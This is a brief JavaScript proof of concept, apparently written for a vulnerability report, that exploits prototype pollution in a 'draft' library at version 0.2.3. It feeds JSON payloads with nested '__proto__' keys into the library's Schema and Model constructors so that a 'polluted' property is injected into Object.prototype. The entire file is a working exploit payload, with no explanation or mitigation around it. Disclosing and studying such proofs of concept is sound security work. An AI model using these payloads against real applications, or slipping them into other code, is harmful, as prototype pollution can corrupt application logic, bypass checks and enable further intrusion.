const draft = require('./draft@0.2.3')

const payload1 = JSON.parse('{"__proto__": {"__proto__": {"polluted": []}}}');
var schema = new draft.Schema(payload1);

const payload2 = JSON.parse('{"__proto__": {"__proto__": {"polluted": "yes"}}}');
var user = new draft.Model(payload2, schema);
